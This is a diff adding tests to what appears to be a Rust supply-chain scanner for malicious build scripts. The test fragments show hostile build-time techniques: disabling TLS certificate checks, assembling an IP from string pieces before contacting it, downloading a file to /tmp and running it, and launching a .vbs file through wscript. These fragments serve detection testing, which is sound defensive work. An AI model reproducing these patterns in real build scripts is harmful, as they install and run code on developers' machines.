@@ -130,6 +130,54 @@ fn main() {
     assert!(has(&rs(&a.build), "reverse shell"), "{:?}", rs(&a.build));
 }
 
+// ---- RA-11 / RA-12: the shapes of arrayref's / proc-macro1's build script, each as a single-technique inert
+// fragment (hosts are .invalid or the 203.0.113.0/24 documentation range; nothing is run). Each is a reason the
+// build script's SC-INSTALL-HOOK is made of; the certificate-checks-off one is a *weaker* reason, so a build
+// script whose only reason is that is MAJOR (install_script_severity), the others CRITICAL.
+
+#[test]
+fn a_client_with_certificate_checks_off() {
+    // RA-12: turning off TLS certificate verification is a reason (a build script that fetches with it off) — a
+    // weaker one, so a build script whose only reason is this is MAJOR, not CRITICAL
+    let a = build(r#"reqwest::blocking::Client::builder().danger_accept_invalid_certs(true).build().unwrap().get("https://example.invalid/p").send().unwrap();"#);
+    let r = rs(&a.build);
+    assert!(has(&r, "turns off TLS certificate verification"), "{:?}", r);
+    let pack = crate::pack::current();
+    let reasons = a.build.as_ref().unwrap().reasons.clone();
+    assert_eq!(crate::signs::install_script_severity(&pack, &reasons), Some("MAJOR"), "cert-off alone is a weaker reason");
+}
+
+#[test]
+fn a_host_assembled_from_pieces_then_contacted() {
+    // the host (a raw IP) is split across string pieces so no literal URL appears; the model joins it
+    let a = build(r#"let url = String::from("http://203.0.") + "113.7" + "/p"; reqwest::blocking::get(&url).unwrap();"#);
+    let r = rs(&a.build);
+    assert!(has(&r, "203.0.113.7") || has(&r, "an address typical of data exfiltration"), "{:?}", r);
+}
+
+#[test]
+fn a_dropped_file_run_with_an_argument() {
+    // a received file written to a temporary path and run with an argument
+    let src = r#"
+use std::process::Command;
+fn main() {
+    let resp = reqwest::blocking::get("https://example.invalid/p").unwrap();
+    std::fs::write("/tmp/stage.exe", &resp.bytes().unwrap()).unwrap();
+    Command::new("/tmp/stage.exe").arg("--install").spawn().unwrap();
+}
+"#;
+    let a = read(&[("build.rs", src), ("src/lib.rs", LIB)], build_opts());
+    let r = rs(&a.build);
+    assert!(has(&r, "downloads a file and then runs it") || has(&r, "downloads a script and runs it"), "{:?}", r);
+}
+
+#[test]
+fn a_windows_script_host_launcher() {
+    // RA-11: wscript/cscript/mshta running a .vbs/.js launcher is a reason (the launcher chain)
+    let a = build(r#"Command::new("wscript").arg("C:\\Users\\Public\\launcher.vbs").spawn().unwrap();"#);
+    assert!(has(&rs(&a.build), "Windows Script Host"), "{:?}", rs(&a.build));
+}
+
 #[test]
 fn a_proc_macro_crate_is_read_as_build_time() {
     // a proc-macro crate's library runs inside the compiler of whoever uses it
